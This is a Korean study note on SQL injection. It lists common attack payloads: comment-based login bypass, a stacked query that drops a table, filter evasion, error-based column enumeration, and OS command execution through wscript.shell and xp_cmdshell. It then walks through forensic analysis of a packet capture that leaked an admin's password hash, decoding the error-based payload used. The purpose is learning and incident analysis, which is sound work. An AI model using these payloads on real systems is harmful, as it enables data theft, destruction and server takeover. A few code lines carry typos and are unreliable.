## 💡 SQL Injection

자주 사용하는 하는 공격 쿼리

### 🧸 주석 처리
전달하고자 하는 SQL 쿼리문에서 뒤의 값들을 주석 처리하여 조건을 참으로 만든다.<br/>
주석: ****, --, #** 등

```
SELECT * FROM users WHERE userID='admin'--' AND userPW='password'
// userPW 값이 무엇이든 admin 계정으로 로그인 가능. 주석 처리를 의미하는 -- 이 존재하기 때문
```

주석은 값을 전달할 때 시그니처 필터링 우회, 공백 제거 등을 위해 사용하기도 한다.

```
DR/**/OP/*bypass filter*/Table
```

### 🧸 세미콜론(;) 사용
세미콜론(;)을 사용하여 쿼리를 종료하고 바로 다음 쿼리를 붙여 보낼 수 있다.

```
SELECT * FROM users; DROP users --
// users 값을 SELECT문으로 조회하고 DROP 시킨다.
```

한 개의 트랜잭션에서 다수의 쿼리를 처리할 수 있다는 의미. 하지만 해당 기능을 지원하지 않거나 DB 구조 배열에 따라 안 될 수도 있다.

### 🧸 문자열 연결 함수
필터식을 우회하기 위해 **concat**이라는 문자열 연결 함수를 사용한다. 

```
concat(string1, string2, string3...)
// = SELECT user || '-' || name FROM users 쿼리는 보통 username이라는 필터식을 우회하기 위해서 사용하는데 concat은 이와 같은 효과를 낼 수 있다.
```

### 🧸 GROUP BY, HAVING 구문
Error Based SQL Injection에 주로 사용되는 구문이다. HAVING과 GROUP BY를 함께 사용하여 GROUP BY에 의한 반환 값에 대해 필터링할 때 사용한다.<br/>
만약 에러가 발생한다면 해당 이슈가 발생한 첫 번째 컬럼 정보를 에러 메시지로 반환하여 사용자에게 노출할 수 있다.

```
GROUP BY table having 1=1 --
// error에 표시된 컬럼 값: firsterror1
GROUP BY table,firsterror1 having 1=1 --
// error에 표시된 컬럼 값: seconderror2
GROUP BY table,firsterror1,seconderror2 having 1=1 --
// error에 표시된 컬럼 값: thirderror3
GROUP BY table,firsterror1,seconderror2,thirderror3 having 1=1 --

// 에러 메시지에 표시된 다음 컬럼 값을 지속해서 에러 메시지가 표시되지 않을 때까지 반복한다.
```

### 🧸 스크립트 사용
Active X가 구동 중이라면 스크립트를 사용하여 명령어를 실행할 수 있다.<br/>
아래는 wscript.shell 스크립트를 이용하여 notepad.exe를 실행하는 예제 코드다.

```
declare @o int
exec sp oacreate 'wscrpit.shell', @o out
exec sp_oamethod @o, 'run', NULL, 'notepad.exe'
```

### 🧸 xp_cmdshell
위 wcsript와 같은 xp_cmdshell의 대체 방법이다. MS-SQL에서 운영 체제 명령어를 실행할 수 있는 확장 저장 프로시저이며, SQL Server 2005에서는 기본적으로 비활성화되어 있다.

```
Exec master.dbo xp_cmdshell 'ping 111.111.111.111'
```

<br/>

## 💡 Error Based SQL Injection
Error Based SQL Injection은 어플리케이션에서 응답하는 에러 메시지에 의존하여 공격한다.
정상적인 웹 어플리케이션 요청은 미리 정의된 값을 전송하여 DB에 요청하는데, 예를 들어 http://test.com/board/view-id.php?num=44 에서 num 파라미터에 특수 문자나 정의되어 있지 않은 값이 들어간다면 DB는 이를 이해하지 못하고 에러 메시지를 출력할 것이다.
<br/>이 때 DB의 오류를 드러내는 취약점이 있다면 악용하여 원하는 데이터를 탈취할 수 있게 된다.
한 번의 쿼리로 원하는 값을 얻을 수 있으므로 비교적 공격 시간이 빠른 편이다.

### 🧸 시나리오: 쇼핑몰 보안 담당자가 캡처한 Error Based SQL 패킷 덤프 파일. 고객 정보 중 관리자 권한이 있는 Juwon1405 계정의 유출이 의심되는 상황이다. 실제 유출이 되었는지 덤프 파일에 대해 분석한다.

먼저 HTTP 요청이 많은 순서부터 분석을 시작하는 것이 좋다. SQL Injection과 같은 자동화 툴을 이용한 공격처럼 많은 트래픽을 발생시키는 특징인 공격 패킷에 적합한 분석법이다.

> **Statistics -> [HTTP] -> [Load Distribution]**

HTTP Requests by Server - HTTP Requests by Server Address에서 Count 값이 많은 순으로 정렬하여본다.
여기서는 221.150.246.62...

![load filter](https://user-images.githubusercontent.com/66156026/213146139-b4ca89b3-e2ce-4bcf-a4d3-ce9c1ae47524.png)

와이어샤크에서 필터식을 준다.

```
ip.addr == 221.150.246.62 && http.request.full_uri
```

Time 필드를 보면 소수점 시간 내에 다량으로 어떤 값들을 요청하고 있음을 알 수 있다. 일반적인 상황에서 정상적인 사용자가 발생시킬 수 있는 패킷과는 거리가 멀다.

Info 필드에서 **HTTP 1/1 200OK text/html** 이라고 적힌 패킷 하나는 잡아 Follow -> TCP Stream 으로 들어간다.

![1394](https://user-images.githubusercontent.com/66156026/213146845-ca853154-c1cb-44eb-ab56-7c80c216fc50.png)

서버는 요청을 정상적으로 처리하여 페이지를 반환하였지만, DB측에서 요청 오류가 생겨 에러 메시지를 발생시킨 것이다.
이 에러는 MySQL에서 흔하게 일어나는 에러로 SQL 문법 에러이다.

MySQL을 사용한다는 것을 알고 있기 때문에 와이어샤크 필터링에 다음과 같은 필터도 적용해보았다.

```
data-text-lines contains "mysql"
```

에러 메시지를 보니 data-text-lines에 적히는 것을 보고 생각해낸 필터링이다. 이렇게 필터링 된 패킷을 보낸 거의 대다수가 MySQL 문법 에러 메시지였는데, 몇 개의 패킷은 group_key 라는 키워드로 에러 메시지를 내고 있었다.

![group_key](https://user-images.githubusercontent.com/66156026/213148040-29e8c69d-c621-4b97-b52d-f57422965bf7.png)

다시 아래와 같이 필터링한다. group_key 키워드에 유출된 데이터가 에러 메시지로 출력된다는 특징을 이용하여 필터를 적용한 것이다.

```
http contains group_key
```

많은 데이터가 Error Based SQL Injection 공격에 의해 유출된 것이 확인된다. 이 데이터들은 **ngrep**을 이용하여 추출한다.

**ngrep download** => ```brew install ngrep```

ngrep의 -I 옵션으로 pcap 파일을 읽고, -t 옵션과 -W의 byline 기능을 사용하여 한 줄씩 출력되도록 하는 명령어이다. 이를 group_key.txt 라는 파일로 저장한다.

```
ngrep -I <file name.pcap> -tWbyLine | grep "for key 'group_key" > group_key.txt
```

아래는 자주 사용되는 ngrep의 옵션들이다.

값|설명
|:---:|:---:
```h```|도움말
```V```|버전 정보
```E```|빈 패킷 필터링
```n[숫자]```|[숫자]에 해당하는 번호의 패킷을 필터링
```i[정규식]```|상태를 무시하고 [정규식]으로 필터링
```v[정규식]```|[정규식]을 포함하지 않은 패킷 필터링
```t```|YYYY/MM/DD HH:MM:SS 형태의 시간과 일치하는 패킷 필터링
```x```|16진수 혹은 아스키 형태의 패킷 필터링
```l[파일이름]```|pcap 형태의 파일을 읽어옴
```O[파일이름]```|결과를 pcap 형태의 파일로 저장함
```D```|패킷 시간 출력

생성된 txt 파일을 보면 불필요한 값인 "Duplicate entry 'qzppq'"와 뒷부분의 "'qxvzq1' for key 'group_key'"가 존재하는 것을 확인할 수 있다.
이를 공백으로 치환해주는 명령어이다.

vi로 txt를 열어 입력해준다.

```
:%s/Duplicate entry 'qzppq//g
:%s/qxvzq1' for key 'group_key'//g
```

아래는 vi 편집기의 치환 관련 명령어이다.

값|설명
|:---:|:---:
```:s/str/abc```|현재 커서 위치의 str을 abc로 치환
```:l,.s/str/abc/```|1부터 현재 커서의 행까지 str을 abc로 치환
```:%s/str/abc/g```|해당 파일의 모든 행의 str을 abc로 치환
```:.$/str/abc```|현재 커서 위치에서 마지막 행까지 모든 str을 abc로 치환

이제 txt 파일을 열어 다음과 같이 유출된 스키마와 데이터베이스명을 확인한다.

![유출된 스키마](https://user-images.githubusercontent.com/66156026/213151567-48284853-236e-464f-ac82-91c2096c4821.png)

조금 밑으로 내리면 관리자 계정인 **junwon1405**의 유출된 개인 정보도 확인할 수 있다.

![junwon](https://user-images.githubusercontent.com/66156026/213152189-1d34f87f-fabd-48fd-a32b-71cbd41caead.png)

유출된 해시값 중 ```D65798AAC0E5C6DF3F320F8A30E026E7EBD73A95``` 을 SHA1 복호화를 하면 패스워드를 확인할 수 있다.

*SHA1 복호화를 할 수 있는 사이트인 hashkiller 등이 지금은 안되는 것 같다...🥲*

다시 와이어샤크에서 junwon씨의 패스워드를 노출시킨 공격 쿼리문을 찾기 위해 필터링을 할 수 있다.

```
http contains D65798AAC0E5C6DF3F320F8A30E026E7EBD73A95
```

Follow -> TCP Stream 한 결과이다.

![2655](https://user-images.githubusercontent.com/66156026/213153250-8c64b746-4073-4dcb-8234-c40f59fa7595.png)

네모 박스 부분은 URL 인코딩 값이다. 이 부분을 디코딩해보면 SQL Injection 공격에 사용된 구문이 나온다.

디코딩은 
[여기](https://www.convertstring.com/ko/EncodeDecode/UrlDecode) 를 사용했다.

```
GET /items.php?num=1 AND (SELECT 4608 FROM(SELECT 
COUNT(*),CONCAT(0x717a707071,(SELECT MID((IFNULL(CAST(
user_pw AS CHAR),0x20)),1,50) FROM dmshop.shop_user ORDER BY id LIMIT 1,1)
,0x7178767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
```


